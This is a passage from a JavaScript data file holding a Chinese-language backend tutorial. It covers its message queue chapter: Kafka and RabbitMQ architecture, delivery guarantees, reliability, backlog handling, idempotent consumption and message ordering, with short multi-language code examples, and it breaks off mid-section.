// =============================================================
// 后端开发综合教程 —— 第七批章节（分布式与工程化，共 5 章）
// -------------------------------------------------------------
// 本文件包含以下章节：
//   1. backend-mq              — 消息队列
//   2. backend-microservice     — 微服务架构
//   3. backend-distributed      — 分布式系统基础
//   4. backend-distributed-tx   — 分布式事务
//   5. backend-security         — 安全防护实战
//
// 每个章节包含：
//   id      : 唯一标识
//   group   : 分组名（分布式与工程化）
//   icon    : 展示用 emoji
//   title   : 章节标题
//   content : Markdown 格式的详细讲解（语言无关原理 + 多语言伪代码对照）
//   code    : 可直接运行的 Node.js 代码（沙箱内执行，用内存结构模拟网络/服务）
//
// 代码运行环境约束（沙箱）：
//   - 仅可 require: fs, path, os, url, crypto, util, events, stream,
//     buffer, querystring, string_decoder, zlib, assert, timers
//   - 没有 http / net / child_process / dns，网络概念用 events/自定义对象模拟
//   - 全局: console, process, Buffer, setTimeout, Promise, URL 等
//   - 支持 top-level await，用 console.log 输出结果
// =============================================================

export const chapters = [
  // =========================================================
  // 第一章：消息队列
  // =========================================================
  {
    id: "backend-mq",
    group: "分布式与工程化",
    icon: "📬",
    title: "消息队列",
    content: `## 消息队列

**消息队列（Message Queue，简称 MQ）** 是分布式系统中最核心的中间件之一。它本质上是一个"消息的暂存与转发系统"：生产者把消息投递给队列，消费者从队列中取出消息进行处理。看似简单的"投递-暂存-消费"模型，却能在异步化、解耦、削峰三大场景中发挥巨大作用，是现代后端架构从单体走向分布式的关键基础设施。

本章将从消息队列的核心价值出发，逐层拆解消息模型、Kafka 与 RabbitMQ 的架构原理、消息可靠性保障、顺序性与幂等、延迟消息实现，以及主流 MQ 的选型决策。

### 一、消息队列的三大核心作用

消息队列不是"为了用而用"的技术，它解决的是分布式系统中的三类典型问题。理解这三类问题，才能判断"该不该上 MQ"。

#### 1.1 异步化：提升响应速度

**场景**：用户注册后，系统需要做三件事——写入数据库、发送欢迎邮件、发放新人优惠券。如果这三件事串行执行，用户可能要等 800ms 才看到"注册成功"。

\`\`\`
同步串行：
  写数据库(50ms) → 发邮件(500ms) → 发券(250ms) → 返回"注册成功"
  总耗时：800ms，用户感受卡顿

异步并行：
  写数据库(50ms) → 投递 MQ 消息 → 立即返回"注册成功"（55ms）
                  ↓ MQ 异步分发
                  ├→ 邮件服务消费(500ms，后台执行)
                  └→ 优惠券服务消费(250ms，后台执行)
  用户只等 55ms，邮件和券在后台慢慢处理
\`\`\`

**核心思想**：把"非关键路径"的操作从同步调用链中剥离，通过 MQ 异步执行。用户只关心"注册是否成功"（写库），不关心"邮件是否已发"（可后台慢慢做）。响应时间从 800ms 降到 55ms，提升 14 倍。

**哪些操作适合异步化**：

- 通知类：邮件、短信、站内信、推送
- 日志类：行为日志、审计日志
- 统计类：积分计算、数据上报
- 非核心业务：推荐预计算、缓存预热

**判断标准**：这个操作的结果，用户是否需要"立即看到"？不需要 → 可以异步。

#### 1.2 解耦：降低系统耦合度

**场景**：订单系统创建订单后，需要通知库存系统扣减库存、通知积分系统加积分、通知物流系统生成运单。如果没有 MQ，订单系统要直接调用这三个系统：

\`\`\`
订单系统 ──调用──→ 库存系统
         ──调用──→ 积分系统
         ──调用──→ 物流系统
\`\`\`

这种"直接调用"带来三个问题：

1. **强耦合**：库存系统挂了，订单系统创建订单也会失败（除非做容错）。
2. **扩展难**：再加一个"风控系统"也要接收订单事件？得改订单系统代码，加一个调用。
3. **依赖扩散**：订单系统要同时维护三个下游的地址、超时、重试策略。

引入 MQ 后：

\`\`\`
订单系统 ──投递"订单创建"消息──→ MQ Topic
                                    ↓
                              ┌─────┼─────┐
                              ↓     ↓     ↓
                          库存  积分  物流（各自订阅，互不影响）
\`\`\`

订单系统只管"把消息投给 MQ"，不关心谁消费、怎么消费。新增订阅者（如风控系统）只需自己订阅 Topic，订单系统零改动。某个消费者挂了也不影响订单创建——消息留在 MQ 里，恢复后继续消费。

**解耦的本质**：从"我主动调你"变成"我发布事件，你自行订阅"。生产者和消费者互不感知，各自独立演进。

#### 1.3 削峰填谷：保护下游系统

**场景**：秒杀活动，平时 QPS 100，活动瞬间 QPS 飙到 10000。如果请求直达数据库，数据库连接池瞬间打满，服务崩溃。

\`\`\`
无 MQ：
  10000 QPS → 订单服务 → 数据库（连接池 100，直接打满，崩溃）

有 MQ：
  10000 QPS → 订单服务 → MQ（消息暂存，容量大）
                              ↓ 按 500 QPS匀速消费
                          数据库（连接池够用，稳定运行）
\`\`\`

MQ 像一个"蓄水池"：上游洪峰来时，消息先堆在队列里；下游按自己的处理能力匀速消费。数据库看到的始终是平稳的 500 QPS，而非尖刺般的 10000 QPS。

**削峰的代价**：消息会有延迟（堆积 → 排队消费），所以削峰适合"对实时性要求不高的场景"。秒杀场景下，用户晚几秒看到"抢购结果"是可接受的，但数据库崩溃是不可接受的。

#### 1.4 三大作用的关系

| 作用 | 解决的问题 | 典型场景 | 代价 |
|------|-----------|---------|------|
| 异步化 | 响应慢 | 注册后发邮件 | 最终一致（邮件可能延迟） |
| 解耦 | 系统强耦合 | 订单触发多业务 | 调试复杂（链路变长） |
| 削峰 | 流量尖刺压垮系统 | 秒杀、促销 | 消息延迟 |

> 一句话总结：MQ 用"引入中间层 + 最终一致"换取"高响应 + 低耦合 + 高可用"。

---

### 二、消息模型详解：P2P 与 Pub/Sub

消息队列有两种基础消息模型，所有 MQ 产品都是这两种的变体或组合。

#### 2.1 点对点模型（Point-to-Point, P2P）

**模型**：一个队列（Queue），多个生产者投递消息，**一条消息只被一个消费者消费**。

\`\`\`
Producer A ──→ ┌─────────────┐ ──→ Consumer 1
               │   Queue     │
Producer B ──→ │ [m1][m2][m3]│ ──→ Consumer 2
               └─────────────┘
               消息被均分给消费者
\`\`\`

**特征**：

- 消息一旦被某个消费者消费（ack 后），就从队列删除。
- 多个消费者**竞争消费**（Competing Consumers），每条消息只被处理一次。
- 适合"任务分发"场景：每个任务只需处理一次，谁来处理都行。

**典型场景**：

- 订单处理：1000 个订单消息，3 个消费者实例并行处理，每个订单只处理一次。
- 图片处理：上传 100 张图，多个 worker 并行压缩，每张图只压缩一次。

**多语言对照（P2P 消费）**：

Java (Kafka):
\`\`\`java
consumer.subscribe(Arrays.asList("order-queue"));
while (true) {
    ConsumerRecords<String, String> records = consumer.poll(Duration.ofMillis(100));
    for (ConsumerRecord<String, String> record : records) {
        processOrder(record.value());
        consumer.commitSync(); // 提交 offset
    }
}
\`\`\`

Python (RabbitMQ pika):
\`\`\`python
def callback(ch, method, properties, body):
    process_order(body)
    ch.basic_ack(delivery_tag=method.delivery_tag)

channel.basic_consume(queue='order-queue', on_message_callback=callback)
channel.start_consuming()
\`\`\`

Go (Sarama Kafka):
\`\`\`go
consumer.ConsumePartition(ctx, "order-queue", 0, sarama.OffsetNewest)
for msg := range partitionConsumer.Messages() {
    processOrder(msg.Value)
}
\`\`\`

#### 2.2 发布订阅模型（Publish/Subscribe, Pub/Sub）

**模型**：一个主题（Topic），生产者发布消息到 Topic，**所有订阅者都会收到全量消息**。

\`\`\`
                  ┌→ Subscriber A（库存服务）收到 m1, m2, m3
Producer → Topic  ┼→ Subscriber B（积分服务）收到 m1, m2, m3
                  └→ Subscriber C（物流服务）收到 m1, m2, m3
\`\`\`

**特征**：

- 每个订阅者独立消费，互不影响。
- 一条消息会被多个订阅者各消费一次（广播）。
- 适合"事件通知"场景：一个事件发生，多方都要响应。

**典型场景**：

- 订单创建事件：库存扣减、积分发放、物流生成都要执行。
- 用户登录事件：风控检测、登录日志、推送通知都要执行。

**P2P vs Pub/Sub 对比**：

| 维度 | P2P（Queue） | Pub/Sub（Topic） |
|------|-------------|-----------------|
| 消费方式 | 竞争消费，一条消息一个消费者 | 广播消费，每个订阅者都收到 |
| 消费者关系 | 互斥（竞争） | 独立（互不影响） |
| 扩展方式 | 加消费者实例分摊负载 | 加订阅者不影响其他 |
| 适用场景 | 任务分发（订单处理） | 事件广播（订单事件通知） |

#### 2.3 Kafka 的混合模型：Topic + Partition + Consumer Group

Kafka 巧妙地把两种模型统一了：

- **Topic** 对外是 Pub/Sub 语义（不同 Consumer Group 各自独立消费全量）。
- **同一个 Consumer Group 内**，消费者竞争消费（P2P 语义，分区分配负载均衡）。

\`\`\`
Topic: orders (3 partitions)
  Partition 0: [m0, m3, m6, m9...]
  Partition 1: [m1, m4, m7, m10...]
  Partition 2: [m2, m5, m8, m11...]

Consumer Group A（订单处理组）:
  Consumer 1 ← Partition 0, 1
  Consumer 2 ← Partition 2
  → Group A 整体消费全量消息（P2P：组内竞争）

Consumer Group B（数据分析组）:
  Consumer 3 ← Partition 0, 1, 2
  → Group B 也消费全量消息（Pub/Sub：组间独立）
\`\`\`

这种设计让 Kafka 既能做"任务分发"（一个 Group 内分摊），又能做"事件广播"（不同 Group 各自消费），非常灵活。

---

### 三、Kafka 架构深度讲解

Apache Kafka 是 LinkedIn 开源的高吞吐分布式消息系统，目前是全球最流行的流处理平台。理解 Kafka 的架构，是理解现代消息队列的基础。

#### 3.1 Kafka 核心概念

\`\`\`
                    ┌─────────────────────────────────────────┐
                    │              Kafka Cluster               │
                    │                                         │
  Producer ───────→│  Broker 1    Broker 2    Broker 3       │──→ Consumer Group
                    │  ┌────────┐ ┌────────┐ ┌────────┐      │
                    │  │Topic A │ │Topic A │ │Topic A │      │
                    │  │ P0(L)  │ │ P1(L)  │ │ P2(L)  │      │
                    │  │ P1(F)  │ │ P2(F)  │ │ P0(F)  │      │
                    │  └────────┘ └────────┘ └────────┘      │
                    │     ↑ 副本同步                           │
                    └─────────────────────────────────────────┘
                    L=Leader  F=Follower
\`\`\`

**核心术语**：

| 概念 | 说明 |
|------|------|
| **Producer** | 消息生产者，往 Kafka 发消息的客户端 |
| **Consumer** | 消息消费者，从 Kafka 读消息的客户端 |
| **Broker** | Kafka 服务节点，一个集群有多个 Broker |
| **Topic** | 消息主题，逻辑分类（如"订单"、"日志"） |
| **Partition** | 分区，Topic 的物理分片，并行单元 |
| **Offset** | 消费者在分区中的消费位置（位移） |
| **Consumer Group** | 消费者组，组内消费者分摊分区 |
| **Replica** | 副本，分区的拷贝，Leader + Follower |
| **ZooKeeper/KRaft** | 集群协调服务（新版用 KRaft 替代 ZK） |

#### 3.2 Partition：并行的基本单元

**分区是 Kafka 并行度的核心**。一个 Topic 有多个 Partition，分布在不同 Broker 上：

\`\`\`
Topic: orders, 3 partitions
  Partition 0 → Broker 1（Leader）, Broker 2（Follower）
  Partition 1 → Broker 2（Leader）, Broker 3（Follower）
  Partition 2 → Broker 3（Leader）, Broker 1（Follower）
\`\`\`

**分区的作用**：

1. **水平扩展**：一个 Topic 的消息分散到多个 Broker，突破单机容量限制。
2. **并行消费**：一个 Consumer Group 内，每个消费者消费不同分区，实现并行。
3. **顺序保证**：**单分区内消息有序**，跨分区不保证顺序。

**分区数怎么定**：

- 吞吐量需求：单分区吞吐约 10MB/s，需要 100MB/s → 至少 10 个分区。
- 消费者数：分区数 ≥ 消费者数（多了的消费者空闲）。
- Broker 数：分区数一般不超过 Broker 数的 2-3 倍。
- 经验值：中等规模 6-12 个分区，大规模 24-100 个。

**分区过多的问题**：每个分区在 Broker 上是一个目录+索引文件，分区过多会导致文件句柄耗尽、故障恢复慢、元数据管理开销大。一般单 Broker 不超过 4000 个分区。

#### 3.3 消息路由：如何决定消息进哪个分区

生产者发送消息时，可以指定分区策略：

\`\`\`
producer.send(topic, key, value)
                     ↑
                     └→ 有 key：hash(key) % partitionCount → 固定分区（同 key 同分区，保证顺序）
                        无 key：轮询(Round Robin) / 粘性(Sticky) → 均匀分布
\`\`\`

**Key 的作用**：

- 相同 Key 的消息总进同一分区 → 分区内有序。
- 例：用 orderId 作为 Key，同一订单的所有事件（创建/支付/发货）都在同一分区，按顺序消费。

**多语言对照（生产者发送）**：

Java:
\`\`\`java
ProducerRecord<String, String> record = new ProducerRecord<>("orders", orderId, orderJson);
producer.send(record, (metadata, e) -> {
    if (e == null) System.out.println("Sent to partition " + metadata.partition());
});
\`\`\`

Python:
\`\`\`python
producer.send('orders', key=order_id, value=order_json)
producer.flush()
\`\`\`

Go:
\`\`\`go
msg := &sarama.ProducerMessage{
    Topic: "orders",
    Key:   sarama.StringEncoder(orderID),
    Value: sarama.StringEncoder(orderJSON),
}
producer.Input() <- msg
\`\`\`

Node.js:
\`\`\`javascript
producer.send({
    topic: 'orders',
    messages: [{ key: orderId, value: orderJson }],
})
\`\`\`

#### 3.4 Offset：消费位移

**Offset 是消费者在分区中的"读指针"**。Kafka 用 Offset 标记"消费到哪了"：

\`\`\`
Partition 0: [m0][m1][m2][m3][m4][m5][m6]
                              ↑ offset=4（已消费到 m4，下次读 m5）
\`\`\`

**Offset 提交方式**：

- **自动提交**：消费者定期自动提交（enable.auto.commit=true），简单但可能重复消费或丢失。
- **手动提交**：处理完成后手动 commitSync() / commitAsync()，精确可控。

**三种消费位置**：

| 配置 | 含义 | 场景 |
|------|------|------|
| earliest | 从最早消息开始消费 | 重新消费历史数据 |
| latest | 只消费新产生的消息 | 默认，不处理积压 |
| 指定 offset | 从特定位置开始 | 跳过坏消息、回溯 |

#### 3.5 Replica：高可用的基础

每个 Partition 有多个副本（Replica），分布在不同 Broker：

\`\`\`
Partition 0:
  Broker 1: Leader（读写都走这里）
  Broker 2: Follower（同步 Leader 数据，Leader 挂了顶上）
  Broker 3: Follower（同上）

ISR（In-Sync Replicas）= 与 Leader 保持同步的副本集合
\`\`\`

**Leader 与 Follower**：

- **Leader**：处理该分区的所有读写请求。
- **Follower**：被动同步 Leader 的数据，不处理客户端请求。
- **ISR**：保持同步的副本集合，Leader 只能从 ISR 中选举。

**故障转移**：Leader 所在 Broker 宕机 → 从 ISR 中选一个 Follower 成为新 Leader → 客户端自动重连新 Leader。

**ISR 与 ack 配置**：

- acks=0：生产者发完不等确认，可能丢消息。
- acks=1：Leader 写入即确认，Leader 挂了可能丢。
- acks=all（-1）：所有 ISR 副本都写入才确认，最安全（配合 min.insync.replicas=2）。

---

### 四、Kafka 为什么高性能

Kafka 的设计目标是"高吞吐、低延迟"，单机就能达到每秒百万级消息写入。它的性能秘密来自六个关键设计。

#### 4.1 顺序写磁盘

**原理**：磁盘的顺序写速度远超随机写。

\`\`\`
机械硬盘：
  随机写：约 100 次/秒（磁头寻道慢）
  顺序写：约 100MB/s（磁头不移动，连续写入）

SSD：
  随机写：约 10000 次/秒
  顺序写：约 500MB/s
\`\`\`

Kafka 把消息追加到 Partition 的日志文件末尾（append-only），永远是顺序写。即使是机械硬盘，吞吐也能达到百兆级。

**对比**：关系型数据库用 B+ 树索引，写入要更新多处（数据页+索引页），大量随机 I/O，所以 DB 的写入吞吐远低于 Kafka。

#### 4.2 页缓存（PageCache）

**原理**：利用操作系统的页缓存，避免数据直接落盘。

\`\`\`
写入流程：
  Producer → Kafka → 写入 PageCache（内存）→ 返回 ack
                                    ↓ OS 异步刷盘
                                 磁盘文件

读取流程：
  Consumer → Kafka → 读 PageCache（命中）→ 直接返回
                              ↓ 未命中
                           磁盘文件 → 加载到 PageCache → 返回
\`\`\`

Kafka 不自己维护内存缓存，而是"信任 OS 的 PageCache"。写入先到 PageCache（极快），OS 异步刷盘；读取优先命中 PageCache（消费者通常紧跟生产者，命中率高）。这让 Kafka 在不消耗 JVM 堆的情况下获得极高吞吐。

**对比**：很多系统自己维护缓存（如 Redis），但 Kafka 认为"OS 的 PageCache 已经足够好，没必要重复造轮子"，而且 PageCache 不受 GC 影响，更稳定。

#### 4.3 零拷贝（Zero Copy / sendfile）

传统数据发送要经历 4 次拷贝 + 4 次上下文切换：

\`\`\`
传统：
  磁盘 → 内核缓冲区 → 用户空间缓冲区 → Socket 缓冲区 → 网卡
  （4 次拷贝，2 次用户态/内核态切换）

零拷贝（sendfile）：
  磁盘 → 内核缓冲区 → 网卡（DMA 直传）
  （2 次拷贝，0 次用户态切换）
\`\`\`

Kafka 消费者读取消息时，用 Linux 的 sendfile 系统调用，数据从内核态直接送到网卡，全程不经用户态。这大幅减少了 CPU 拷贝和上下文切换开销。

Java 的 \`FileChannel.transferTo()\` 底层就是 sendfile。

#### 4.4 批量发送与压缩

**批量发送**：生产者不是发一条就网络传输一条，而是"攒一批"再发：

\`\`\`
未批量：1000 条消息 → 1000 次网络请求 → 1000 次 IO
批量：  1000 条消息 → 1 次网络请求（攒成一个大 batch）→ 1 次 IO
\`\`\`

配置 \`batch.size\`（批大小字节）和 \`linger.ms\`（等待攒批的时间），在延迟和吞吐间权衡。

**压缩**：Kafka 支持对整个 batch 压缩（gzip/snappy/lz4/zstd）：

\`\`\`
1000 条 JSON 消息，每条 1KB → 总 1MB
gzip 压缩后 → 约 200KB → 网络传输量减少 80%
\`\`\`

压缩在生产者端做，解压在消费者端做，Broker 存储的也是压缩后的数据（省存储+省带宽）。

#### 4.5 分区并行

如前所述，多 Partition 分布在多 Broker，生产者和消费者都可以并行操作不同分区。这是 Kafka 水平扩展的基础——加 Broker 就能加分区、加吞吐。

#### 4.6 性能数据参考

| 配置 | 吞吐量 | 延迟 |
|------|--------|------|
| 单 Broker，单分区，ack=1 | ~100MB/s | ~5ms |
| 单 Broker，6 分区，ack=1 | ~600MB/s | ~5ms |
| 3 Broker 集群，18 分区，ack=all | ~1.5GB/s | ~10ms |
| 消费者消费（零拷贝） | ~200MB/s/消费者 | ~2ms |

> 一句话：Kafka 的高性能 = 顺序写 + PageCache + 零拷贝 + 批量压缩 + 分区并行。每个设计都"把硬件能力榨干"。

---

### 五、Kafka 消息投递语义

消息投递语义回答"消息会不会丢、会不会重复"的问题。Kafka 支持三种语义。

#### 5.1 At-Most-Once（至多一次）

**语义**：消息最多投递一次，可能丢失，不会重复。

**实现**：

- 生产者：acks=0，发完不等确认。
- 消费者：先提交 offset，再处理消息。

\`\`\`
Producer → 发消息 → 不等 ack → 网络丢包 → 消息丢失（OK，至多一次）
Consumer → 先 commit offset → 再 process → 处理中崩溃 → 消息没处理但 offset 已提交（丢失）
\`\`\`

**适用场景**：日志收集、监控指标——丢几条无所谓。

#### 5.2 At-Least-Once（至少一次）

**语义**：消息至少投递一次，不会丢失，可能重复。

**实现**：

- 生产者：acks=all，失败重试。
- 消费者：先处理消息，再提交 offset。

\`\`\`
Producer → 发消息 → ack=all 确认 → 失败则重试 → 可能重复发送（但不会丢）
Consumer → process → 成功 → commit offset → 崩溃前未 commit → 重启后重新消费（重复）
\`\`\`

**适用场景**：大多数业务场景（订单、支付），配合**消费端幂等**解决重复问题。

**这是 Kafka 默认语义，也是生产中最常用的。**

#### 5.3 Exactly-Once（精确一次）

**语义**：消息精确投递一次，不丢不重。

**实现**：Kafka 0.11+ 引入幂等生产者 + 事务：

- **幂等生产者**：enable.idempotence=true，Kafka 给每条消息分配 PID + SequenceNumber，Broker 去重，防止生产者重试导致重复。
- **事务**：把"消费-处理-生产"作为一个原子事务，要么全成功，要么全回滚。

\`\`\`
事务流程（消费-处理-生产）：
  beginTransaction()
  → consume from input-topic
  → process
  → produce to output-topic
  → commit offset（事务内）
  → commitTransaction()  // 原子提交：输出消息 + offset 提交 一起生效
\`\`\`

**适用场景**：金融转账、精确计费——不能多也不能少。

**注意**：Exactly-Once 有性能开销（事务协调），不是所有场景都需要。大多数业务用 At-Least-Once + 幂等消费就够了。

#### 5.4 三种语义对比

| 语义 | 丢失 | 重复 | 实现 | 适用场景 |
|------|------|------|------|---------|
| At-Most-Once | 可能 | 不会 | acks=0, 先提交offset | 日志、监控 |
| At-Least-Once | 不会 | 可能 | acks=all, 后提交offset | 订单、支付（+幂等） |
| Exactly-Once | 不会 | 不会 | 幂等+事务 | 金融、计费 |

---

### 六、RabbitMQ 架构与 Exchange 类型

RabbitMQ 是基于 AMQP 协议的消息中间件，以"灵活的路由"和"可靠性"著称，与企业级 Java 应用集成广泛。

#### 6.1 RabbitMQ 核心架构

\`\`\`
Producer → Exchange ←─binding─→ Queue → Consumer
              ↑
         路由规则
         (routing key)
\`\`\`

| 概念 | 说明 |
|------|------|
| **Exchange** | 交换机，接收生产者消息，按规则路由到队列 |
| **Queue** | 队列，存储消息，消费者从中取 |
| **Binding** | 绑定，Exchange 和 Queue 之间的路由规则 |
| **Routing Key** | 路由键，生产者发送时指定，Exchange 按它路由 |
| **Channel** | 通道，连接内的轻量虚拟连接 |

与 Kafka 的关键区别：RabbitMQ 是"Exchange 路由到 Queue"模型，Kafka 是"Topic-Partition"模型。RabbitMQ 的路由更灵活，Kafka 的吞吐更高。

#### 6.2 四种 Exchange 类型

**1. Direct Exchange（直连）**

精确匹配 routing key：

\`\`\`
Exchange(direct) ──routing key="order.create"──→ Queue A（订单处理）
                 ──routing key="order.cancel"──→ Queue B（取消处理）

消息 routing key="order.create" → 只进 Queue A
\`\`\`

适用：点对点精确路由。

**2. Fanout Exchange（扇出）**

忽略 routing key，广播到所有绑定的队列：

\`\`\`
Exchange(fanout) ──→ Queue A（库存）
                 ──→ Queue B（积分）
                 ──→ Queue C（物流）

每条消息都进所有队列（广播）
\`\`\`

适用：事件广播（Pub/Sub）。

**3. Topic Exchange（主题）**

按模式匹配 routing key（支持通配符）：

\`\`\`
* 匹配一个单词，# 匹配零个或多个单词

Exchange(topic) ──binding "order.*"──→ Queue A（处理所有 order 事件）
                 ──binding "order.create"──→ Queue B（只处理创建）
                 ──binding "*.create"──→ Queue C（处理所有 create 事件）

routing key="order.create" → 进 Queue A, B, C
routing key="order.cancel" → 进 Queue A
routing key="user.create"  → 进 Queue C
\`\`\`

适用：灵活的事件路由（最常用）。

**4. Headers Exchange（头部）**

按消息头属性匹配（不看 routing key）：

\`\`\`
Exchange(headers) ──binding {format: json, type: order}──→ Queue A
消息 headers={format:json, type:order} → 进 Queue A
\`\`\`

适用：复杂条件路由（较少用）。

#### 6.3 四种 Exchange 对比

| 类型 | 路由方式 | 灵活性 | 性能 | 典型场景 |
|------|---------|--------|------|---------|
| direct | 精确匹配 | 低 | 高 | 点对点 |
| fanout | 广播 | 无 | 中 | 事件广播 |
| topic | 模式匹配 | 高 | 中 | 灵活路由（最常用） |
| headers | 头部匹配 | 高 | 低 | 复杂条件 |

---

### 七、消息可靠性三道防线

消息从生产到消费，要经过"生产者→Broker→消费者"三个环节，任何一个环节都可能丢消息。可靠性保障需要三道防线。

#### 7.1 第一道：生产端确认（Producer Confirm）

**问题**：生产者发消息后，怎么知道 Broker 收到了？

**Kafka 方案**：acks 机制 + 回调：

\`\`\`java
// acks=all，所有副本确认才算成功
producer.send(record, (metadata, e) -> {
    if (e != null) {
        // 发送失败，重试
        retrySend(record);
    }
});
\`\`\`

**RabbitMQ 方案**：Confirm 模式：

\`\`\`python
channel.confirm_delivery()
try:
    channel.basic_publish(exchange='', routing_key='orders',
                          body=msg, mandatory=True)
    print('确认收到')
except UnroutableError:
    print('消息无法路由，需处理')
\`\`\`

**关键配置**：

- 重试次数：retries，但要注意"重试可能造成重复"。
- 超时时间：delivery.timeout.ms。
- 本地缓存：发送失败的消息先存本地，后台重发。

#### 7.2 第二道：Broker 持久化

**问题**：Broker 收到消息后宕机了，消息会不会丢？

**Kafka 方案**：

- 副本机制：acks=all + min.insync.replicas≥2，多副本都写入才确认。
- 日志持久化：消息写入日志文件（靠 PageCache + 顺序写，性能高）。

**RabbitMQ 方案**：

- 队列持久化：声明队列时 durable=true。
- 消息持久化：发送时 deliveryMode=2（持久化）。

\`\`\`python
# 队列持久化
channel.queue_declare(queue='orders', durable=True)
# 消息持久化
channel.basic_publish(exchange='', routing_key='orders',
                      body=msg,
                      properties=pika.BasicProperties(delivery_mode=2))
\`\`\`

**注意**：RabbitMQ 持久化消息写磁盘有性能损耗（比非持久化慢 10 倍），需权衡。

#### 7.3 第三道：消费端手动 ACK

**问题**：消费者取出消息后，处理到一半崩溃了，消息怎么办？

**错误做法**：自动 ack（取出即 ack）→ 处理崩溃 → 消息丢失！

**正确做法**：手动 ack（处理完才 ack）→ 崩溃 → 未 ack → Broker 重投。

\`\`\`python
# RabbitMQ 手动 ack
def callback(ch, method, properties, body):
    try:
        process_order(body)
        ch.basic_ack(delivery_tag=method.delivery_tag)  # 处理成功才 ack
    except Exception as e:
        ch.basic_nack(delivery_tag=method.delivery_tag, requeue=False)  # 失败不重新入队，进死信
\`\`\`

\`\`\`java
// Kafka 手动提交 offset
ConsumerRecords<String, String> records = consumer.poll(Duration.ofMillis(100));
for (ConsumerRecord<String, String> record : records) {
    processOrder(record.value());
}
consumer.commitSync();  // 全部处理完才提交
\`\`\`

**注意**：手动 ack 的代价是"消息可能被重复消费"（处理完但 ack 前崩溃），所以消费端必须幂等。

#### 7.4 三道防线总结

| 防线 | 环节 | 机制 | 保障 |
|------|------|------|------|
| 第一道 | 生产端→Broker | ack/confirm + 重试 | 消息不丢（生产端） |
| 第二道 | Broker | 持久化 + 副本 | Broker 不丢 |
| 第三道 | Broker→消费端 | 手动 ack | 消费端不丢 |

三道全开，消息可靠性最高。但可靠性越高，性能越低，需按业务权衡。

---

### 八、消息积压排查与处理

**消息积压** 是生产中最常见的 MQ 故障：消费者速度跟不上生产者，消息大量堆积在队列里。

#### 8.1 积压的原因

1. **消费速度下降**：消费者依赖的数据库变慢、下游服务超时。
2. **生产速度突增**：促销、秒杀、批量推送。
3. **消费者宕机**：消费者实例挂了，没人消费。
4. **消费逻辑有 bug**：某条消息导致消费者卡死（死循环/无限重试）。

#### 8.2 积压的影响

- 消息延迟：业务事件晚到几十分钟甚至几小时。
- 内存/磁盘压力：积压消息占用 Broker 存储。
- 雪崩：积压导致消费者内存溢出，更多消费者挂掉。

#### 8.3 应急处理方案

**方案一：扩消费者**

最快的方式——加消费者实例。但前提是分区数足够（Kafka 中消费者数不能超过分区数）。

\`\`\`
积压 100 万条，每个消费者 100 条/秒
  3 个消费者 → 3333 秒（55 分钟）消化
  10 个消费者 → 1000 秒（17 分钟）消化
  30 个消费者 → 333 秒（5 分钟）消化
\`\`\`

**方案二：临时 Topic 扩容（Kafka）**

分区数不够，加消费者也没用（多余的消费者空闲）。临时增加分区数：

\`\`\`
原 Topic 6 分区 6 消费者 → 消费速度饱和
临时扩到 30 分区 30 消费者 → 消费速度 5 倍

注意：扩分区后，原 Key 的路由会变（hash(key) % partitionCount 变化），
可能破坏顺序性。临时方案，消化完积压后可恢复。
\`\`\`

**方案三：降级 + 熔断**

如果消费者变慢是因为下游（如数据库）撑不住：

- 关闭非核心消费（如暂停日志消费，保订单消费）。
- 对下游做熔断，快速失败而非等待超时。
- 降级处理：积压期间用简化逻辑（如只写缓存不写库）。

**方案四：消息转发到新队列**

写一个"快速消费者"只做转发，把积压消息转到多个新队列，每个新队列配独立消费者，实现"扇出并行消化"。

#### 8.4 长期预防

- **监控告警**：积压量超过阈值（如 1 万条）立即告警。
- **容量规划**：按峰值流量规划消费者数和分区数。
- **消费超时**：单条消息处理超时自动跳过（进死信），避免卡死。
- **压测**：上线前压测消费速度，确保 > 生产速度。

---

### 九、消息重复消费与幂等

**重复消费是消息队列的"常态"而非"异常"**。因为 At-Least-Once 语义下，网络抖动、消费者重启、ack 丢失都可能导致重复。

#### 9.1 重复消费的常见原因

\`\`\`
场景1：消费者处理完，ack 前崩溃 → 重启后重新消费（重复）
场景2：生产者发送超时，重试 → Broker 收到两条（重复）
场景3：Rebalance 时，offset 未提交 → 新消费者从旧位置消费（重复）
场景4：网络抖动导致 ack 丢失 → Broker 认为没消费，重投（重复）
\`\`\`

#### 9.2 幂等设计：让重复消费无害化

幂等（Idempotent）：同一操作执行多次，结果与执行一次相同。

**方案一：业务状态判断**

\`\`\`java
// 订单状态机：已支付的订单不能再支付
public void payOrder(String orderId) {
    Order order = orderDao.findById(orderId);
    if (order.getStatus() == PAID) {
        return;  // 已支付，幂等返回
    }
    order.setStatus(PAID);
    orderDao.update(order);
}
\`\`\`

**方案二：去重表（唯一索引）**

\`\`\`sql
-- 去重表，message_id 唯一索引
CREATE TABLE consumed_messages (
    message_id VARCHAR(64) PRIMARY KEY,
    consumed_at TIMESTAMP
);

-- 消费时：先插去重表，成功才处理
INSERT INTO consumed_messages(message_id) VALUES(?);
-- 若主键冲突（重复消费），INSERT 失败，跳过处理
\`\`\`

**方案三：Redis 去重**

\`\`\`python
# 用 SETNX 去重
if redis.setnx(f"msg:{message_id}", "1", ex=86400):
    process_message(msg)  # 第一次，处理
else:
    return  # 已处理，跳过
\`\`\`

**方案四：版本号/乐观锁**

\`\`\`sql
-- 带版本号的更新，重复更新不影响
UPDATE account SET balance = balance + 100, version = version + 1
WHERE user_id = ? AND version = ?;
\`\`\`

#### 9.3 幂等设计要点

| 方案 | 实现 | 适用 | 注意 |
|------|------|------|------|
| 业务状态 | 检查状态再操作 | 有状态机的业务 | 状态判断要准确 |
| 去重表 | 唯一索引 | 通用 | 需要额外表 |
| Redis SETNX | 缓存标记 | 高并发 | 需设过期时间 |
| 乐观锁 | 版本号 | 更新操作 | 需要版本字段 |

**核心原则**：不要假设"消息只消费一次"，必须假设"消息可能重复消费 N 次"，设计幂等逻辑。

---

### 十、消息顺序性保证

**问题**：有些业务要求消息按顺序处理，如"创建订单→支付→发货"，如果"发货"先于"支付"被消费，业务就乱了。

#### 10.1 为什么会乱序

\`\`\`
Topic 有 3 个分区，消息被轮询分配：
  Partition 0: [创建订单]
  Partition 1: [支付]
  Partition 2: [发货]

3 个消费者分别消费 3 个分区，并发执行：
  消费者2 先消费"支付" → 消费者3 消费"发货" → 消费者1 消费"创建订单"
  顺序乱了！
\`\`\`

#### 10.2 顺序保证方案

**方案一：单分区**

Topic 只设 1 个分区，所有消息进同一分区，单消费者消费，天然有序。

- 优点：简单，绝对有序。
- 缺点：失去并行性，吞吐受限。

**方案二：业务 Key 哈希路由**

用业务 ID（如 orderId）作为 Key，同一订单的消息进同一分区，分区内有序：

\`\`\`
